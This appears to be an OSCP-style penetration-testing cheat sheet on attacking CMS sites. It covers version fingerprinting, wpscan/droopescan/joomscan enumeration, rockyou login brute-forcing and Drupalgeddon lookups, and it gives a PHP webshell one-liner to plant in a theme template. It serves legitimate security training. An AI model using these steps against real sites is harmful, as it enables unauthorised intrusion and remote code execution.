## Goal
Identify the CMS + EXACT version, run its scanner, and exploit a vulnerable plugin/theme/core or use admin access to edit a template into a webshell. CMS boxes are a top OSCP foothold. (App-servers like Tomcat/Jenkins/phpMyAdmin -> [[web_apps_panels]].)

**Checklist**
- [ ] which CMS + version? (whatweb, /wp-login, /administrator, /CHANGELOG.txt, meta generator)
- [ ] scanner run? (wpscan / droopescan / joomscan)
- [ ] vulnerable plugin/theme/core CVE?
- [ ] admin creds -> theme/template edit or plugin upload for a shell?

# Commands

### Step 1: Identify CMS + version
```bash
whatweb http://$IP
curl -s http://$IP | grep -iE 'generator|wp-content|drupal|joomla'
# WordPress: /wp-login.php /wp-admin /wp-content ; version in readme.html or /?feed=rss
# Drupal:    /CHANGELOG.txt /user/login /node ; "Drupal" in X-Generator header
# Joomla:    /administrator /README.txt ; version in /administrator/manifests/files/joomla.xml
```

### Step 2: WordPress
```bash
wpscan --url http://$IP --enumerate u,vp,vt,tt --api-token <token>    # users + vuln plugins/themes
wpscan --url http://$IP --enumerate ap --plugins-detection aggressive # ALL plugins (not just vuln)
wpscan --url http://$IP -U admin -P /usr/share/wordlists/rockyou.txt  # login brute
# admin panel -> Appearance > Theme Editor -> put <?php system($_GET[c]);?> in 404.php -> visit it
# or Plugins > Upload a malicious plugin zip
```

### Step 3: Drupal
```bash
droopescan scan drupal -u http://$IP
# Drupalgeddon2 CVE-2018-7600 (7.x/8.x) unauth RCE (public PoC)
# Drupalgeddon3 CVE-2018-7602 authed RCE
# admin -> enable PHP filter module -> create a node with <?php ?> ; or upload a module
```

### Step 4: Joomla
```bash
droopescan scan joomla -u http://$IP
joomscan -u http://$IP
# admin -> Templates > edit index.php -> webshell
# check com_ components + version -> searchsploit joomla <component>
```

### Step 5: Magento / others
```bash
# Magento -> magescan scan url http://$IP ; CVE-2015-1397 "Shoplift" SQLi
# any CMS: pin EXACT version -> searchsploit <cms> <version>
```

### Helpline
```bash
# HOW TO FIND THE VERSION (you need it for searchsploit):
#   WordPress -> readme.html, meta generator tag, /?feed=rss, or /wp-includes/version.php via LFI
#   Drupal    -> /CHANGELOG.txt  (D8+: /core/CHANGELOG.txt)
#   Joomla    -> /administrator/manifests/files/joomla.xml , /language/en-GB/en-GB.xml
# WHAT TO LOOK FOR: the vuln is usually a PLUGIN/THEME, not core -> enumerate ALL plugins
#   (wpscan --enumerate ap aggressive), then searchsploit each. don't stop at core version.
# ANY admin login (reused/brute creds) -> theme/template editor = webshell = RCE. that's the
#   most common CMS path: get into wp-admin/administrator, edit a .php template, browse to it.
# get a free wpscan API token or the vuln DB rate-limits. reuse found creds before brute-forcing.
```
